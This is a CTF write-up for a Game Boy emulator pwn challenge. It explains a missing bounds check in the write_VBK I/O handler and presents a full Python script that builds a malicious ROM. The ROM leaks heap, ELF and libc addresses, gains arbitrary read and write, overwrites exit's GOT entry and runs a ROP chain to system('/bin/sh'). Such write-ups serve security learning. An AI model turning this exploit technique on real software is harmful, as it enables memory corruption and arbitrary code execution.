---
date: 2024-07-29 07:26
challenge: gb
tags:
  - VM pwn
---

# 不是很想看 VM，把 i 大爷的 wp 存一下

# tl;dr

In `main_bus.c:write_VBK`, `data` was not checked and this caused an oob. Use pointers of struct io_reg on the heap to leak heap base and elf base, then arbitary read/write, leak libc, stack, place rop, modify exit_got and finally set running to 0.

# full wp

In this chal, we need to create a gameboy rom, and this chal will simulate the rom. Our goal is to break the gameboy vm and read flag file.

## Introduction to gameboy

This part should be much difficult, but it's easy for me, because I've reversed several gb rom in other CTF reverse chals. So I just skipped this part.

## Reading codes

As a CTF pwn chal, this gameboy chal is a typical vm chal. After reading the opcode implementation, there're two types of opcode: arithmetic and memory operations. Obviously, arithmetic operations don't interact with datas outside the vm directly, so we should focus on those memory operations.

Here's the read/write operation:

```
WRAM_SIZE 0x1000
RAM_SIZE 0x2000
ROM_BANK_SIZE 0x4000
ROM_SIZE: 0x8000

MMAP:
ROM_banks[0] = mmap(ROM_SIZE << num_ROM)
VRAM_banks[0] = mmap(RAM_SIZE * num_VRAM) # 1
WRAM_banks[0] = mmap(WRAM_SIZE * num_WRAM) # 2

bus:
ROM_B0 = ROM_banks[0]
ROM_BN = ROM_banks[1]
VRAM = VRAM_banks[0]
EXRAM = EXRAM_banks[0]
WRAM_B0 = WRAM_banks[0]
WRAM_BN = WRAM_banks[1]

read:
[0x0000: 0x4000]: banking_mode_select ? ROM_banks[reg2 << 5][i] : ROM_banks[0][i]
[0x4000: 0x8000]: ROM_banks[cur_ROM][i - 0x4000]
[0x8000: 0xa000]: VRAM[i - 0x8000]
[0xa000: 0xc000] && RAM_enabled: banking_mode_select ? EXRAM_banks[cur_EXRAM][i - 0xa000] : EXRAM_banks[0][i - 0xa000]
[0xc000: 0xd000]: WRAM_B0[i - 0xc000]
[0xd000: 0xf000]: WRAM_BN[i - 0xd000]
[0xf000: 0xfe00]: error
[0xfe00: 0xfea0]: OAM[i - 0xfe00]
[0xfea0: 0xff00]: error
[0xff00: 0xff80]: check_io_reg(i)->read_callback()
[0xff80: 0xffff]: HRAM[i - 0xff80]

write:
[0x0000: 0x2000] && ((val & 0xf) == 0xa): RAM_enabled = true
[0x2000: 0x4000]: reg1 = val & 0x1f; update_rom()
[0x4000: 0x6000]: reg2 = val & 0x03; update_rom(); cur_EXRAM = reg2
[0x6000: 0x8000]: banking_mode_select = val & 1; update_rom()
[0x8000: 0xa000]: VRAM[i - 0x8000] = val
[0xa000: 0xc000] && RAM_enabled: EXRAM_banks[cur_EXRAM][i - 0xa000] = val
[0xc000: 0xd000]: WRAM_B0[i - 0xc000] = i
[0xd000: 0xf000]: WRAM_BN[i - 0xd000] = i
[0xf000: 0xfe00]: error
[0xfe00: 0xfea0]: OAM[i - 0xfe00] = i
[0xfea0: 0xff00]: error
[0xff00: 0xff80]: check_io_reg(i)->write_callback(i)
[0xff80: 0xffff]: HRAM[i - 0xff80] = i
```

In fact, there's a bug: WRAM_SIZE is 0x1000 but WRAM_BN has a size of 0x2000. But after exploring this further, I found this does no help to break the vm. The last part is `check_io_reg`.

## Found the bug

In `emulator.c:init_io`, there defines many io ports operations. After scanning them one by one, I found this:

```
init_io_reg(VBK, read_VBK, write_VBK);


void write_VBK(byte data){
    bus->VRAM = bus->mapper->VRAM_banks[data];
    bus->mapper->cur_VRAM = data;
}
```

`write_VBK` does not check the argument `data`, so we can set VRAM to any pointer on the heap within `VRAM_banks` and `&VRAM_banks[256]`.

## Exploit

Fortunately, the `io_reg` list items are in this range. We can set VRAM and read next and function pointers to get heap base and elf base:

```python
data += write_VBK(0x42)

# 0xc000: heap_base
data += set_qword(0xc000, 0x730)
data += rsub_qword(0xc000, 0x8000) # [0xc000] = [0x8000] - 0x730

# 0xc008: elf_base
data += set_qword(0xc008, 0x77d0)
data += rsub_qword(0xc008, 0x8010)
```

Then we can place pointer to acheive arbitary read/write:

```python
def set_vram(phy_addr_in_vm_addr):
    return (
        write_VBK(0x3c) +
        mov_qword(0x8000, phy_addr_in_vm_addr) +
        write_VBK(0x36)
    )

def read_any(to_vm_addr, from_phy_addr_in_vm_addr):
    return (
        set_vram(from_phy_addr_in_vm_addr) +
        mov_qword(to_vm_addr, 0x8000)
    )

def write_any(to_phy_addr_in_vm_addr, from_vm_addr):
    return (
        set_vram(to_phy_addr_in_vm_addr) +
        mov_qword(0x8000, from_vm_addr)
    )
```

Then read got table in elf to leak libc, read environ in libc to leak stack, place rop on the stack and finally set `running` to 0 to exit the program. But it calls exit other than returning to main, so we just modify exit_got to trigger this rop.

full exp to build gb rom:

```python
#!/usr/bin/env python3

def write_int(data, index, value):
    data[index: index + 4] = value.to_bytes(4, 'little')
    return index + 4

def write_short(data, index, value):
    data[index: index + 2] = value.to_bytes(2, 'little')
    return index + 2

def write_byte(data, index, value):
    data[index] = value
    return index + 1

def write_bytes(data, index, value):
    data[index: index + len(value)] = value
    return index + len(value)

def push_hl():
    return b'\xe5'

def pop_hl():
    return b'\xe1'

def set_hl(val):
    return b'\x21' + val.to_bytes(2, 'little')

def write_mem(val):
    return b'\x36' + val.to_bytes(1, 'little')

def set_de(val):
    return b'\x11' + val.to_bytes(2, 'little')

def ld_de():
    return b'\x1a'

def st_de():
    return b'\x12'

def set_bc(val):
    return b'\x01' + val.to_bytes(2, 'little')

def ld_bc():
    return b'\x0a'

def st_bc():
    return b'\x02'

def ld_hl():
    return b'\x7e'

def st_hl():
    return b'\x77'

def inc_bc():
    return b'\x03'

def inc_de():
    return b'\x13'

def inc_hl():
    return b'\x23'

def add_hl(): # add a, [hl]
    return b'\x86'

def sub_hl(): # sub a, [hl]
    return b'\x96'

def adc_hl(): # adc a, [hl]
    return b'\x8e'

def sbc_hl(): # sbc a, [hl]
    return b'\x9e'

def add_hl_bc():
    return b'\x09'

def set_hl_bc():
    return set_hl(0) + add_hl_bc()

def ret():
    return b'\xc9'

def call(target):
    return b'\xcd' + target.to_bytes(2, 'little')

def add_qword_func():
    # [bc] += [de]
    return b''.join([
        push_hl(),
        set_hl_bc(),

        ld_de(),
        inc_de(),
        add_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        adc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        adc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        adc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        adc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        adc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        adc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        adc_hl(),
        st_hl(),
        inc_hl(),

        pop_hl(),
        ret()
    ])

def rsub_qword_func():
    # [bc] = [de] - [bc]
    return b''.join([
        push_hl(),
        set_hl_bc(),

        ld_de(),
        inc_de(),
        sub_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        sbc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        sbc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        sbc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        sbc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        sbc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        sbc_hl(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        sbc_hl(),
        st_hl(),
        inc_hl(),

        pop_hl(),
        ret()
    ])

def mov_qword_func():
    # [bc] = [de]
    return b''.join([
        push_hl(),
        set_hl_bc(),

        ld_de(),
        inc_de(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        st_hl(),
        inc_hl(),

        ld_de(),
        inc_de(),
        st_hl(),
        inc_hl(),

        pop_hl(),
        ret()
    ])

def set_qword(addr, val):
    return b''.join([
        push_hl(),
        set_hl(addr),
        write_mem((val >> 0x00) & 0xff),
        inc_hl(),
        write_mem((val >> 0x08) & 0xff),
        inc_hl(),
        write_mem((val >> 0x10) & 0xff),
        inc_hl(),
        write_mem((val >> 0x18) & 0xff),
        inc_hl(),
        write_mem((val >> 0x20) & 0xff),
        inc_hl(),
        write_mem((val >> 0x28) & 0xff),
        inc_hl(),
        write_mem((val >> 0x30) & 0xff),
        inc_hl(),
        write_mem((val >> 0x38) & 0xff),
        pop_hl()
    ])

def putchar(val):
    return b''.join([
        push_hl(),
        set_hl(0xff01), # SB
        write_mem(val), # write_SB(val)
        set_hl(0xff02), # SC
        write_mem(0x81), # write_SC(0x81)
        pop_hl()
    ])

def puts(s):
    data = b''
    for i in s:
        data += putchar(ord(i))
    return data + putchar(0x0a)

def jmp_abs(target):
    return b'\xc3' + target.to_bytes(2, 'little')

def write_VBK(val):
    return b''.join([
        push_hl(),
        set_hl(0xff4f),
        write_mem(val),
        pop_hl()
    ])

def build_gb():
    data = bytearray(0x150)
    index = 0x100
    index = write_bytes(data, index, jmp_abs(0x150).ljust(4, b'\x00')) # cart->entry
    index = write_bytes(data, index, b'\x00' * 0x30) # cart->logo
    write_bytes(data, index, b'\x00' * 0x10) # cart->title
    index = 0x13f
    index = write_int(data, index, 0) # cart->manufacturer_code
    index = write_byte(data, index, 0) # cart->CGB_flag
    index = write_short(data, index, 0x3030) # cart->new_licensee_code
    index = write_byte(data, index, 0) # cart->SBG_flag
    index = write_byte(data, index, 1) # cart->cart_type
    index = write_byte(data, index, 1) # cart->num_ROM
    index = write_byte(data, index, 0) # cart->val_RAM
    index = write_byte(data, index, 0) # cart->dest_code
    index = write_byte(data, index, 0x33) # cart->old_licensee_code
    index = write_byte(data, index, 1) # cart->mask_rom_version_numer
    index = write_byte(data, index, 0) # cart->header_checksum
    write_short(data, index, 0) # cart->global_checksum

    mov_qword_addr = len(data)
    data += mov_qword_func()
    def mov_qword(addr1, addr2):
        return set_bc(addr1) + set_de(addr2) + call(mov_qword_addr)

    add_qword_addr = len(data)
    data += add_qword_func()
    def add_qword(addr1, addr2):
        return set_bc(addr1) + set_de(addr2) + call(add_qword_addr)

    rsub_qword_addr = len(data)
    data += rsub_qword_func()
    def rsub_qword(addr1, addr2): # [addr1] = [addr2] - [addr1]
        return set_bc(addr1) + set_de(addr2) + call(rsub_qword_addr)

    entry = len(data)
    write_bytes(data, 0x100, jmp_abs(entry).ljust(4, b'\x00')) # cart->entry

    data += write_VBK(0x42)

    # 0xc000: heap_base
    data += set_qword(0xc000, 0x730)
    data += rsub_qword(0xc000, 0x8000) # [0xc000] = [0x8000] - 0x730

    # 0xc008: elf_base
    data += set_qword(0xc008, 0x77d0)
    data += rsub_qword(0xc008, 0x8010)

    def set_vram(phy_addr_in_vm_addr):
        return (
            write_VBK(0x3c) +
            mov_qword(0x8000, phy_addr_in_vm_addr) +
            write_VBK(0x36)
        )

    def read_any(to_vm_addr, from_phy_addr_in_vm_addr):
        return (
            set_vram(from_phy_addr_in_vm_addr) +
            mov_qword(to_vm_addr, 0x8000)
        )

    def write_any(to_phy_addr_in_vm_addr, from_vm_addr):
        return (
            set_vram(to_phy_addr_in_vm_addr) +
            mov_qword(0x8000, from_vm_addr)
        )

    data += b''.join([
        set_qword(0xc018, 0xcfc0),
        add_qword(0xc018, 0xc008), # __libc_start_main got
        read_any(0xc018, 0xc018), # __libc_start_main
        set_qword(0xc010, libc.sym['__libc_start_main']),
        rsub_qword(0xc010, 0xc018), # libc base
        set_qword(0xc020, libc.sym['environ']),
        add_qword(0xc020, 0xc010), # &environ
        read_any(0xc020, 0xc020), # environ
        set_qword(0xc018, 0x138 + 0x1000),
        rsub_qword(0xc018, 0xc020), # &run_ret - 0x1000

        # set_qword(0xc028, 0x29fce), # add rsp, 0x98; ret
        set_qword(0xc028, 0x125ff9), # add rsp, 0x??; ret
        add_qword(0xc028, 0xc010), # add libc base
        set_qword(0xc030, 0xd040),
        add_qword(0xc030, 0xc008), # exit_got
        set_vram(0xc030),
        mov_qword(0x8000, 0xc028), # set exit_got to "add rsp, 0x??; ret"
    ])

    data += b''.join([
        set_qword(0xc028, 0x2c49),
        add_qword(0xc028, 0xc008), # 0xc028: ret
        set_qword(0xc030, 0x2c48),
        add_qword(0xc030, 0xc008), # 0xc030: pop rdi
        set_qword(0xc038, next(libc.search(b'/bin/sh\x00'))),
        add_qword(0xc038, 0xc010), # 0xc038: str_bin_sh
        set_qword(0xc040, libc.sym['system']),
        add_qword(0xc040, 0xc010), # 0xc040: system

        set_vram(0xc018),
        b''.join(mov_qword(0x9000 + 8 * i, 0xc028) for i in range(-8, 9)), # enough ret buffer
        mov_qword(0x9000 + 8 * 9, 0xc030),
        mov_qword(0x9008 + 8 * 9, 0xc038),
        mov_qword(0x9010 + 8 * 9, 0xc040),
    ])

    # WRAM
    # 0xc000: heap_base
    # 0xc008: elf_base
    # 0xc010: libc_base


    data += puts("done")

    data += b''.join([
        set_qword(0xc048, 0),
        write_VBK(0x3c),
        mov_qword(0x8000, 0xc048), # clear io_reg list->next

        set_qword(0xc048, 0x12c18 - 0x1800), # &running - 0x1800
        add_qword(0xc048, 0xc008), # add elf base
        set_qword(0xc050, 0),

        write_VBK(0x3c) +
        mov_qword(0x8008, 0xc048) +
        write_VBK(0x37),

        mov_qword(0x8000 + 0x1800, 0xc050), # set running to 0
    ])

    # data += b'\x76' # halt

    # pc = len(data)
    # data += jmp_abs(pc)

    assert len(data) < 0x8000
    return data

from pwn import *
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

data = build_gb()
open('test.gb', 'wb').write(data)

'''
malloc:
bus = malloc(0x50)
map = malloc(0x60)
ROM_banks = malloc(8 * (2 << num_ROM))
VRAM_banks = malloc(8 * num_VRAM) # 1, 0x20
WRAM_banks = malloc(0x40) # 0x50
HRAM = malloc(0x7e) # 0x90
OAM = malloc(0xa0) # 0xb0

io_reg *reg = malloc(sizeof(*reg)) # 0x30

WRAM_SIZE 0x1000
RAM_SIZE 0x2000
ROM_BANK_SIZE 0x4000
ROM_SIZE: 0x8000

MMAP:
ROM_banks[0] = mmap(ROM_SIZE << num_ROM)
VRAM_banks[0] = mmap(RAM_SIZE * num_VRAM) # 1
WRAM_banks[0] = mmap(WRAM_SIZE * num_WRAM) # 2

bus:
ROM_B0 = ROM_banks[0]
ROM_BN = ROM_banks[1]
VRAM = VRAM_banks[0]
EXRAM = EXRAM_banks[0]
WRAM_B0 = WRAM_banks[0]
WRAM_BN = WRAM_banks[1]

read:
[0x0000: 0x4000]: banking_mode_select ? ROM_banks[reg2 << 5][i] : ROM_banks[0][i]
[0x4000: 0x8000]: ROM_banks[cur_ROM][i - 0x4000]
[0x8000: 0xa000]: VRAM[i - 0x8000]
[0xa000: 0xc000] && RAM_enabled: banking_mode_select ? EXRAM_banks[cur_EXRAM][i - 0xa000] : EXRAM_banks[0][i - 0xa000]
[0xc000: 0xd000]: WRAM_B0[i - 0xc000]
[0xd000: 0xf000]: WRAM_BN[i - 0xd000]
[0xf000: 0xfe00]: error
[0xfe00: 0xfea0]: OAM[i - 0xfe00]
[0xfea0: 0xff00]: error
[0xff00: 0xff80]: check_io_reg(i)->read_callback()
[0xff80: 0xffff]: HRAM[i - 0xff80]

write:
[0x0000: 0x2000] && ((val & 0xf) == 0xa): RAM_enabled = true
[0x2000: 0x4000]: reg1 = val & 0x1f; update_rom()
[0x4000: 0x6000]: reg2 = val & 0x03; update_rom(); cur_EXRAM = reg2
[0x6000: 0x8000]: banking_mode_select = val & 1; update_rom()
[0x8000: 0xa000]: VRAM[i - 0x8000] = val
[0xa000: 0xc000] && RAM_enabled: EXRAM_banks[cur_EXRAM][i - 0xa000] = val
[0xc000: 0xd000]: WRAM_B0[i - 0xc000] = i
[0xd000: 0xf000]: WRAM_BN[i - 0xd000] = i
[0xf000: 0xfe00]: error
[0xfe00: 0xfea0]: OAM[i - 0xfe00] = i
[0xfea0: 0xff00]: error
[0xff00: 0xff80]: check_io_reg(i)->write_callback(i)
[0xff80: 0xffff]: HRAM[i - 0xff80] = i
'''

```
